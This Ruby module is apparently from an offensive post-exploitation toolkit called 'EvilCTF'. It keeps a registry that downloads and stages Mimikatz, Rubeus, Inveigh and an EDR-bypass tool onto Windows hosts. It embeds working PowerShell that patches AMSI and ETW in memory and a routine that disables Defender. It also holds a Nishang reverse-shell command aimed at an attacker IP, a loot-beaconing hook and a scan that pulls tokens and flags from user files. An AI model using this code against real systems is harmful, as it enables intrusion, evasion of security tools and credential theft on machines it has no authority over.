#!/usr/bin/env ruby
# frozen_string_literal: true
# Compatibility shim – define Fixnum for very old Rubies (pre-2.4)
if RUBY_VERSION.to_f < 2.4
  class Fixnum < Integer; end unless defined?(Fixnum)
end
require 'fileutils'
require 'zip'
require 'uri'
require 'net/http'
require 'json'
require 'base64'
require 'digest/sha1'
require 'readline'
require 'shellwords'
require 'evil_ctf/uploader'
require_relative 'tools/downloader'
require_relative 'tools/stager'
require_relative 'tools/macro_engine'
require_relative 'tools/alias_engine'
require_relative 'tools/catalog_renderer'
require_relative 'tools/loot_scanner'
require_relative 'tools/loot_store'

module EvilCTF::Tools
  TOOL_REGISTRY = {
    'sharphound' => {
      name: 'SharpHound (BloodHound Collector)',
      filename: 'SharpHound.exe',
      search_patterns: ['SharpHound.exe', 'SharpHound*.exe'],
      description: 'BloodHound AD collector',
      url: 'https://github.com/SpecterOps/SharpHound',
      download_url: 'https://github.com/SpecterOps/SharpHound/releases/latest/download/SharpHound.exe',
      backup_urls: [
        'https://github.com/BloodHoundAD/SharpHound/releases/latest/download/SharpHound.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\SharpHound.exe',
      auto_execute: false,
      category: 'recon'
    },
    'mimikatz' => {
      name: 'Mimikatz',
      filename: 'mimikatz_trunk.zip',
      search_patterns: ['mimikatz.exe', 'mimikatz_x64.exe'],
      description: 'Credential dumping tool',
      url: 'https://github.com/ParrotSec/mimikatz',
      download_url: 'https://github.com/ParrotSec/mimikatz/releases/latest/download/mimikatz_trunk.zip',
      backup_urls: [
        'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip'
      ],
      zip: true,
      zip_pick_x64: 'mimikatz_trunk/x64/mimikatz.exe',
      zip_pick_x86: 'mimikatz_trunk/win32/mimikatz.exe',
      recommended_remote: 'C:\\Users\\Public\\mimikatz.exe',
      auto_execute: false,
      category: 'privilege'
    },
    'powerview' => {
      name: 'PowerView',
      filename: 'PowerView.ps1',
      search_patterns: ['PowerView.ps1', 'PowerView*.ps1'],
      description: 'AD recon PowerShell script',
      url: 'https://github.com/BC-SECURITY/Empire',
      download_url: 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/modules/powershell/situational_awareness/network/powerview.ps1',
      backup_urls: [
        'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1',
        'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\PowerView.ps1',
      auto_execute: false,
      category: 'recon'
    },
    'rubeus' => {
      name: 'Rubeus',
      filename: 'Rubeus.exe',
      search_patterns: ['Rubeus.exe', 'Rubeus*.exe'],
      description: 'Kerberos abuse / roasting tool',
      url: 'https://github.com/GhostPack/Rubeus',
      download_url: 'https://github.com/giveen/compiled-exploit-binaries/blob/main/Rubeus.exe',
      backup_urls: [
        'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/CompiledBinaries/Rubeus.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Rubeus.exe',
      auto_execute: false,
      category: 'privilege'
    },
    'seatbelt' => {
      name: 'Seatbelt',
      filename: 'Seatbelt.exe',
      search_patterns: ['Seatbelt.exe', 'Seatbelt*.exe'],
      description: 'Security auditing tool',
      url: 'https://github.com/GhostPack/Seatbelt',
      download_url: 'https://github.com/GhostPack/Seatbelt/releases/latest/download/Seatbelt.exe',
      backup_urls: [
        'https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/CompiledBinaries/Seatbelt.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Seatbelt.exe',
      auto_execute: false,
      category: 'recon'
    },
    'inveigh' => {
      name: 'Inveigh',
      filename: 'Inveigh.ps1',
      search_patterns: ['Inveigh.ps1', 'Inveigh*.ps1'],
      description: 'LLMNR/mDNS/NBNS spoofer / MITM',
      url: 'https://github.com/Kevin-Robertson/Inveigh',
      download_url: 'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1',
      backup_urls: [
        'https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.psm1'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Inveigh.ps1',
      auto_execute: false,
      category: 'privilege'
    },
    'procdump' => {
      name: 'ProcDump',
      filename: 'procdump64.exe', # Will be adjusted based on architecture
      search_patterns: ['procdump.exe', 'procdump64.exe'],
      description: 'Sysinternals LSASS dumper',
      url: 'https://learn.microsoft.com/en-us/sysinternals/downloads/procdump',
      download_url: 'https://live.sysinternals.com/procdump64.exe',
      backup_urls: [
        'https://live.sysinternals.com/procdump.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\procdump64.exe',
      auto_execute: false,
      category: 'privilege'
    },
    'winpeas' => {
      name: 'WinPEAS',
      filename: 'winPEASany_ofs.exe',
      search_patterns: ['winPEAS*.exe', 'winPEASany*.exe'],
      description: 'Windows privilege escalation checker',
      url: 'https://github.com/peass-ng/PEASS-ng',
      download_url: 'https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe',
      backup_urls: [
        'https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\winPEAS.exe',
      auto_execute: false,
      category: 'privilege'
    },
    'invoke_mimikatz' => {
      name: 'Invoke-Mimikatz',
      filename: 'Invoke-Mimikatz.ps1',
      search_patterns: ['Invoke-Mimikatz.ps1'],
      description: 'PowerShell version of Mimikatz for credential extraction',
      url: 'https://github.com/PowerShellMafia/PowerSploit',
      download_url: 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1',
      backup_urls: [
        'https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\Invoke-Mimikatz.ps1',
      auto_execute: false,
      category: 'privilege'
    },
    'nishang' => {
      name: 'Nishang',
      filename: 'nishang.zip',
      search_patterns: ['nishang.zip', 'nishang-master.zip'],
      description: 'Offensive PowerShell scripts collection',
      url: 'https://github.com/samratashok/nishang',
      download_url: 'https://github.com/samratashok/nishang/archive/refs/heads/master.zip',
      backup_urls: [],
      zip: true,
      zip_pick: 'nishang-master',
      recommended_remote: 'C:\\Users\\Public\\nishang-master',
      auto_execute: false,
      category: 'recon'
    },
    'socksproxy' => {
      name: 'Invoke-SocksProxy',
      filename: 'Invoke-SocksProxy.psm1',
      search_patterns: ['Invoke-SocksProxy.psm1', 'Invoke-SocksProxy.ps1'],
      description: 'SOCKS pivot via PowerShell module',
      url: 'https://github.com/p3nt4/Invoke-SocksProxy',
      download_url: 'https://raw.githubusercontent.com/p3nt4/Invoke-SocksProxy/master/Invoke-SocksProxy.psm1',
      backup_urls: [
        'https://raw.githubusercontent.com/p3nt4/Invoke-SocksProxy/main/Invoke-SocksProxy.psm1'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\socks.ps1',
      auto_execute: false,
      category: 'pivot'
    },
    'plink' => {
      name: 'Plink',
      filename: 'plink.exe',
      search_patterns: ['plink.exe', 'plink*.exe'],
      description: 'PuTTY Link - SSH tunnel tool',
      url: 'https://www.chiark.greenend.org.uk/~sgtatham/putty/',
      download_url: 'https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe',
      backup_urls: [
        'https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe'
      ],
      zip: false,
      recommended_remote: 'C:\\Users\\Public\\plink.exe',
      auto_execute: false,
      category: 'pivot'
    },
    'edr_redir' => {
      name: 'EDR-Redir V2',
      filename: 'EDR-Redir_2.0.zip',
      search_patterns: ['EDR-Redir.exe'],
      description: 'EDR bypass tool using bind links',
      url: 'https://github.com/TwoSevenOneT/EDR-Redir',
      download_url: 'https://github.com/TwoSevenOneT/EDR-Redir/releases/download/V2/EDR-Redir_2.0.zip',
      backup_urls: [],
      zip: true,
      zip_pick_x64: 'EDR-Redir.exe',
      recommended_remote: 'C:\\Users\\Public\\EDR-Redir.exe',
      auto_execute: false,
      category: 'pivot'
    }
  }.freeze
  # AMSI bypass script
  BYPASS_4MSI_PS = <<~PS
    try {
      $kernel32 = 'using System; using System.Runtime.InteropServices; public class kernel32 { [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name); [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect); }'
      Add-Type -TypeDefinition $kernel32 -ErrorAction SilentlyContinue

      $amsiDll = [kernel32]::LoadLibrary("amsi.dll")
      if ($amsiDll -eq [IntPtr]::Zero) {
        "[!] AMSI bypass failed: amsi.dll not loaded"
      } else {
        $patch = [Byte[]] (0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0x48, 0xC3)
        $scanBuffer = [kernel32]::GetProcAddress($amsiDll, "AmsiScanBuffer")
        if ($scanBuffer -ne [IntPtr]::Zero) {
          $oldProtect = 0
          [kernel32]::VirtualProtect($scanBuffer, [uint32]13, 0x40, [ref]$oldProtect) | Out-Null
          [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanBuffer, 13)
          "[+] AmsiScanBuffer patched"
        } else {
          "[!] AMSI bypass warning: AmsiScanBuffer not found"
        }

        # Fallback: also patch AmsiScanString (newer Windows builds)
        $scanString = [kernel32]::GetProcAddress($amsiDll, "AmsiScanString")
        if ($scanString -ne [IntPtr]::Zero) {
          $oldProtectString = 0
          [kernel32]::VirtualProtect($scanString, [uint32]13, 0x40, [ref]$oldProtectString) | Out-Null
          [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $scanString, 13) | Out-Null
          "[+] AmsiScanString patched as fallback"
        }
      }
      "[+] AMSI bypass routine completed"
    } catch {
      "[!] AMSI bypass exception: $($_.Exception.Message)"
    }
  PS
  # ETW bypass script
  ETW_BYPASS_PS = <<~PS
    try {
      $kernel32 = 'using System; using System.Runtime.InteropServices; public class kernel32 { [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name); [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect); }'
      Add-Type -TypeDefinition $kernel32 -ErrorAction SilentlyContinue

      $ntdll = [kernel32]::LoadLibrary("ntdll.dll")
      if ($ntdll -eq [IntPtr]::Zero) {
        "[!] ETW bypass failed: ntdll.dll not loaded"
      } else {
        # Patch only the most stable ETW exports to reduce provider-host crashes.
        $funcs = @("EtwEventWrite", "EtwEventWriteTransfer", "EtwEventWriteFull", "EtwEventWriteEx")
        $patch = [Byte[]] (0x48, 0x33, 0xC0, 0xC3) # xor rax,rax ; ret
        $patchLen = [uint32]$patch.Length
        $patched = 0

        foreach ($f in $funcs) {
          $addr = [kernel32]::GetProcAddress($ntdll, $f)
          if ($addr -ne [IntPtr]::Zero) {
            $old = 0
            [kernel32]::VirtualProtect($addr, $patchLen, 0x40, [ref]$old) | Out-Null
            [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
            $patched++
          }
        }
        "[+] ETW patch-only bypass completed (patched funcs: $patched)"
      }
    } catch {
      "[!] ETW bypass exception: $($_.Exception.Message)"
    }
  PS

  # Windows version-aware bypass selector
  BYPASS_DETECTION_PS = <<~PS
    $osBuild = (Get-CimInstance Win32_OperatingSystem).BuildNumber
    $arch = $env:PROCESSOR_ARCHITECTURE
    $psVersion = $PSVersionTable.PSVersion.Major
    "[+] OS Build: $osBuild | Arch: $arch | PS Version: $psVersion"
    if ([int]$osBuild -lt 9600) {
      "[+] Legacy Windows build detected - using conservative bypass mode"
      "[+] Standard bypass will be used (BYPASS_4MSI_PS + ETW_BYPASS_PS)"
    } elseif ([int]$osBuild -ge 22000) {
      "[+] Windows 11/Server 2022+ detected - using enhanced bypass"
      "[+] Enhanced AMSI/ETW routines enabled by default constants"
    } else {
      "[+] Windows 10/Server 2016/2019 detected - using standard bypass"
      "[+] Standard bypass will be used (BYPASS_4MSI_PS + ETW_BYPASS_PS)"
    }
  PS

  # Post-bypass verification script
  BYPASS_VERIFICATION_PS = <<~PS
    # Verify AMSI bypass
    $amsiResult = 0
    try {
        $null = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils')
        $amsiType = [Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils')
        if ($amsiType) {
            $amsiResult = $amsiType.GetMethod('ScanString', [Reflection.BindingFlags]'NonPublic, Static').Invoke($null, @('test', [Ref]([Int32]::MinValue)))
            if ($amsiResult -eq 0x80070007) {
                "[+] AMSI bypass verified (return code: 0x80070007)"
            } else {
          "[!] AMSI bypass failed (return code: 0x{0:x})" -f $amsiResult
            }
        }
    } catch {
        "[+] AMSI bypass status unknown (AmsiUtils not found)"
    }
    # ETW verification is informational in patch-only mode.
    "[+] ETW bypass verification: patch-only mode enabled"
    "[+] Bypass verification complete"
  PS

  POWERVIEW_ALL_PS = <<~PS
    try {
      $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop
      if (-not $cs.PartOfDomain) {
        Write-Output "[!] Host is not domain joined. Skipping PowerView domain enumeration."
        return
      }

      IEX (Get-Content "C:\Users\Public\PowerView.ps1" -Raw)

      $commands = @(
        @{ Name = 'Get-DomainUser'; Action = { Get-DomainUser -ErrorAction Stop } },
        @{ Name = 'Get-DomainGroup'; Action = { Get-DomainGroup -ErrorAction Stop } },
        @{ Name = 'Get-DomainComputer'; Action = { Get-DomainComputer -ErrorAction Stop } },
        @{ Name = 'Get-DomainPolicy'; Action = { Get-DomainPolicy -ErrorAction Stop } },
        @{ Name = 'Get-DomainTrust'; Action = { Get-DomainTrust -ErrorAction Stop } }
      )

      foreach ($command in $commands) {
        try {
          Write-Output "=== $($command.Name) ==="
          & $command.Action
        } catch {
          Write-Output "[!] $($command.Name) failed: $($_.Exception.Message)"
        }
      }
    } catch {
      Write-Output "[!] PowerView enumeration aborted: $($_.Exception.Message)"
    }
  PS

  DOM_ENUM_PS = <<~PS
    try {
      $cs = Get-WmiObject Win32_ComputerSystem -ErrorAction Stop
      if (-not $cs.PartOfDomain) {
        Write-Output "[!] Host is not domain joined. Skipping dom_enum enumeration."
        return
      }

      IEX (Get-Content "C:\Users\Public\PowerView.ps1" -Raw)

      $commands = @(
        @{ Name = 'Get-Domain'; Action = { Get-Domain -ErrorAction Stop } },
        @{ Name = 'Get-DomainController'; Action = { Get-DomainController -ErrorAction Stop } },
        @{ Name = 'Get-DomainUser'; Action = { Get-DomainUser -ErrorAction Stop } },
        @{ Name = 'Get-DomainGroup'; Action = { Get-DomainGroup -ErrorAction Stop } },
        @{ Name = 'Get-DomainComputer'; Action = { Get-DomainComputer -ErrorAction Stop } },
        @{ Name = 'Get-DomainPolicy'; Action = { Get-DomainPolicy -ErrorAction Stop } },
        @{ Name = 'Get-DomainGPO'; Action = { Get-DomainGPO -ErrorAction Stop } },
        @{ Name = 'Get-DomainOU'; Action = { Get-DomainOU -ErrorAction Stop } },
        @{ Name = 'Get-DomainTrust'; Action = { Get-DomainTrust -ErrorAction Stop } },
        @{ Name = 'Get-ForestDomain'; Action = { Get-ForestDomain -ErrorAction Stop } },
        @{ Name = 'Find-DomainShare'; Action = { Find-DomainShare -ErrorAction Stop } },
        @{ Name = 'Get-DomainFileServer'; Action = { Get-DomainFileServer -ErrorAction Stop } },
        @{ Name = 'Get-DomainForeignUser'; Action = { Get-DomainForeignUser -ErrorAction Stop } },
        @{ Name = 'Get-DomainForeignGroupMember'; Action = { Get-DomainForeignGroupMember -ErrorAction Stop } },
        @{ Name = 'Find-InterestingDomainAcl'; Action = { Find-InterestingDomainAcl -ErrorAction Stop } }
      )

      foreach ($command in $commands) {
        try {
          Write-Output "=== $($command.Name) ==="
          & $command.Action
        } catch {
          Write-Output "[!] $($command.Name) failed: $($_.Exception.Message)"
        }
      }
    } catch {
      Write-Output "[!] dom_enum aborted: $($_.Exception.Message)"
    }
  PS

  NISHANG_REV_REMOTE = 'C:\Users\Public\nishang-master\Shells\Invoke-PowerShellTcp.ps1'
  NISHANG_REV_PS = 'IEX (Get-Content "[NishangRevRemote]" -Raw); Invoke-PowerShellTcp -Reverse -IPAddress [AttackerIP] -Port [AttackerPort]'
  INVEIGH_REMOTE = 'C:\Users\Public\Inveigh.ps1'
  INVEIGH_START_PS = 'IEX (Get-Content "[InveighRemote]" -Raw); Invoke-Inveigh -ConsoleOutput N -FileOutput Y'

  def self.disable_defender(shell)
  # Check OS version
  os_info = shell.run('systeminfo | findstr /i "os name"').output.strip
  if os_info.include?("Windows 10")
    puts "[*] OS: Windows 10 detected. Running standard Defender disable..."
  elsif os_info.include?("Windows 11")
    puts "[!] WARNING: This technique only works on Windows 10."
    puts "    On Windows 11, use `tool win11_defender_bypass` or `wscript` bypass."
    puts "    See: https://github.com/aventurella/Win11-Defender-Bypass"
    return
  else
    puts "[!] Unknown OS: #{os_info}"
    return
  end

  # Check for Tamper Protection
  tamper_check = shell.run('Get-MpComputerStatus | Select-Object IsTamperProtected')
  if tamper_check.output.include?('True')
    puts "[!] Tamper Protection Enabled, will try anyways"
  end

  # Check Real-Time Protection
  status = shell.run('Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled')
  if status.output.strip == 'True'
    puts "[*] Real-time protection is currently enabled"
  else
    puts "[-] Defender is already disabled"
    return
  end

  # Attempt to disable using standard method first
  ps_cmd = <<~PS
    try {
      $defender = Get-MpComputerStatus
      if ($defender.RealTimeProtectionEnabled) {
        Set-MpPreference -DisableRealtimeMonitoring $true
        Write-Output "[+] Defender real-time monitoring disabled"
      } else {
        Write-Output "[-] Defender already disabled"
      }
    } catch {
      Write-Output "[!] Failed to disable Defender: $($_.Exception.Message)"
    }
  PS

  exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 60)
  puts exec_res.output

  # Final check: is Defender still enabled?
  final_status = EvilCTF::Execution.run(shell, 'Get-MpComputerStatus | Select-Object -ExpandProperty RealTimeProtectionEnabled', timeout: 10)
  if final_status.output.strip == 'True'
    puts "[!] WARNING: Defender is still enabled after attempted disable."
    puts "[*] Attempting EDR-Redir V2 bypass..."
    
    # Download and stage EDR-Redir
    edr_redir_path = download_tool('edr_redir')
    if !edr_redir_path
      puts "[!] Failed to download EDR-Redir"
      return false
    end
    
    # Stage EDR-Redir on target system
    remote_edr_redir = 'C:\\Users\\Public\\EDR-Redir.exe'
    EvilCTF::Uploader.upload_file(local_path: edr_redir_path, remote_path: remote_edr_redir, shell: shell)
    
    # Create temporary directory and run EDR-Redir to redirect Defender
    ps_cmd = <<~PS
      try {
        New-Item -ItemType Directory -Path "C:\\TMP\\TEMPDIR" -Force | Out-Null
        $result = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_edr_redir)}' -ArgumentList "C:\\ProgramData\\Microsoft C:\\TMP\\TEMPDIR \"C:\\ProgramData\\Microsoft\\Windows Defender\"" -PassThru -Wait
        if ($result.ExitCode -eq 0) {
          Write-Output "[+] EDR-Redir V2 executed successfully"
        } else {
          Write-Output "[!] EDR-Redir V2 failed with exit code: $($result.ExitCode)"
        }
      } catch {
        Write-Output "[!] Error running EDR-Redir: $($_.Exception.Message)"
      }
    PS
    
    result = shell.run(ps_cmd)
    puts result.output
    
    # Move tools to the redirected location
    puts "[*] Moving tools to redirected directory..."
    
  else
    puts "[+] Defender successfully disabled with standard method"
  end
end  
  
  
  class CommandManager
    include MacroEngine
    include AliasEngine

    def initialize
      @aliases = build_aliases
      @macros = build_macros
    end

    def list_macros
      @macros.keys.sort
    end
  end
  # Helper functions for tool handling
  def self.download_tool(key, remote_download: false, shell: nil)
    Downloader.download_tool(
      key,
      registry: TOOL_REGISTRY,
      remote_download: remote_download,
      shell: shell
    )
  end
  def self.download_from_url(url, path)
    Downloader.download_from_url(url, path)
  end
  def self.download_missing_tools(remote_download: false, shell: nil)
    Downloader.download_missing_tools(
      registry: TOOL_REGISTRY,
      remote_download: remote_download,
      shell: shell
    )
  end
  # Auto staging logic (simplified from original)
  def self.safe_autostage(tool_key, shell, options, logger)
    Stager.safe_autostage(
      tool_key,
      shell,
      options,
      logger,
      registry: TOOL_REGISTRY,
      download_tool_proc: method(:download_tool)
    )
  end
  def self.execute_staged_tool(key, args = '', shell)
    Stager.execute_staged_tool(key, args, shell, registry: TOOL_REGISTRY)
  end

  def self.locate_extracted_remote_path(shell, recommended_remote, extracted_file)
    Stager.locate_extracted_remote_path(shell, recommended_remote, extracted_file)
  end
  def self.list_available_tools
    CatalogRenderer.list_available_tools(registry: TOOL_REGISTRY)
  end
  # Helper functions for loot handling
  def self.grep_output(output)
    LootScanner.grep_output(output)
  end

  def self.save_loot(matches, event_logfile: nil)
    LootStore.save_loot(matches, event_logfile: event_logfile)
  end

  def self.beacon_loot(webhook, matches)
    LootStore.beacon_loot(webhook, matches)
  end
 
  def self.find_tool_on_disk(tool_key)
    Stager.find_tool_on_disk(tool_key, registry: TOOL_REGISTRY)
  end
  def self.get_system_architecture(shell)
    Stager.get_system_architecture(shell)
  end
  

  def self.load_config_profile(name)
    profile_file = File.join('config', "#{name}.yaml")
    return {} unless File.exist?(profile_file)
    YAML.safe_load(File.read(profile_file)) || {}
  rescue => e
    puts "[!] Failed to load profile #{name}: #{e.message}"
    {}
  end
  def self.save_config_profile(name, options)
    profile_file = File.join('config', "#{name}.yaml")
    FileUtils.mkdir_p(File.dirname(profile_file))
   
    File.write(profile_file, YAML.dump(options))
    puts "[+] Profile saved to #{profile_file}"
  rescue => e
    puts "[!] Failed to save profile: #{e.message}"
  end
  # loot_show as per review
  def self.loot_show
    loot_dir = 'loot/'
    files = Dir.glob("#{loot_dir}**/*").select { |f| File.file?(f) }
    puts "Loot Items: #{files.count}"
    files.each { |f| puts "#{f.sub(loot_dir, '')} (#{File.size(f)} bytes)" }
  end
  # New method for automatic flag scan and download
  def self.auto_download_flags(shell)
    # Use regex to find flag patterns
    patterns = [
      /flag\{[^\}]+\}/i,
      /picoctf\{[^\}]+\}/i,
      /htb\{[^\}]+\}/i,
      /ctf\{[^\}]+\}/i,
      /token\s*[:=]\s*["']?([^"'\s]+)["']?/i
    ]

  # Use Get-ChildItem with -Recurse and -Filter
    ps = <<~PS
      $patterns = #{patterns.map(&:source).to_json}
      $files = Get-ChildItem -Path "C:\\Users" -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
        $_.Length -gt 0 -and $_.Name -notmatch "^\." 
      }
      $found = @()
      foreach ($file in $files) {
        try {
          $content = Get-Content $file.FullName -Raw
          $matches = $content | Select-String -Pattern $patterns -AllMatches
          if ($matches) {
            $flag = $matches.Matches | ForEach-Object { $_.Value }
            $found += [PSCustomObject]@{
              Path = $file.FullName
              Content = $flag -join '; '
            }
          }
        } catch {}
      }
      $found | ConvertTo-Json -Depth 5
    PS

    begin
      result = shell.run(ps)
      data = JSON.parse(result.output)
      data.each do |f|
        puts "\n[+] Found flag: #{f['Path']}"
        puts f['Content']
        # Save to loot
        local_path = "loot/#{File.basename(f['Path'])}"
        EvilCTF::Uploader.download_file(remote_path: f['Path'], local_path: local_path, shell: shell)
      end
    rescue => e
      puts "[!] Flag scan failed: #{e.message}"
    end
  end

end
